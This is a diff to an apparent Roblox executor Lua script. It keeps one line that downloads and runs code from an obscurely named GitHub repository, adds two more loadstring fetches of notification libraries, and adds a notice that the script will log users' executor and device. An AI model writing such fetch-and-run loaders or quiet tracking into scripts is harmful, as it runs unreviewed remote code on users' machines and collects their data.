@@ -68,3 +68,23 @@ Players.PlayerAdded:Connect(function(player)
 end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
+
+local NotificationHolder = loadstring(
+    game:HttpGet(
+        'https://raw.githubusercontent.com/DozeIsOkLol/NotificationLibs/refs/heads/main/BocusLukeNotif/ModuleSource.lua'
+    )
+)()
+local Notification = loadstring(
+    game:HttpGet(
+        'https://raw.githubusercontent.com/DozeIsOkLol/NotificationLibs/refs/heads/main/BocusLukeNotif/ClientSource.lua'
+    )
+)()
+
+Notification:Notify(
+    { Title = 'NOTICE!', Description = 'This script will soon log what executor and device you are using, this is to improve the experience for our users.' },
+    { OutlineColor = Color3.fromRGB(80, 80, 80), Time = 20, Type = 'image' },
+    {
+        Image = 'http://www.roblox.com/asset/?id=6023426923',
+        ImageColor = Color3.fromRGB(255, 84, 84),
+    }
+)
